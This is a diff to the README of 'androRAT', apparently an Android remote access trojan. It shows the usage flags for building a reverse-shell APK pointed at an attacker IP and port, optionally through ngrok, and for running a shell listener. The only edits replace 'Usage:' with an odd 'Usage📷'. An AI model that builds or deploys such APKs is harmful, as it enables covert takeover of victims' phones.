@@ -59,7 +59,7 @@ You must run Git bash with administrator privileges.
 ### `build` mode
 
 ```
-Usage:
+Usage📷
   python3 androRAT.py --build --ngrok [flags]
   Flags:
     -p, --port              Attacker port number (optional by default its set to 8000)
@@ -68,7 +68,7 @@ Usage:
 ```
 
 ```
-Usage:
+Usage📷
   python3 androRAT.py --build [flags]
   Flags:
     -i, --ip                Attacker IP address (required)
@@ -80,7 +80,7 @@ Usage:
 Or you can manually build the apk by importing [Android Code](Android_Code) folder to Android Studio and changing the IP address and port number in [config.java](Android_Code/app/src/main/java/com/example/reverseshell2/config.java) file and then you can generate the signed apk from `Android Studio -> Build -> Generate Signed APK(s)`
 ### `shell` mode
 ```
-Usage:
+Usage📷
   python3 androRAT.py --shell [flags]
   Flags:
     -i, --ip                Listner IP address
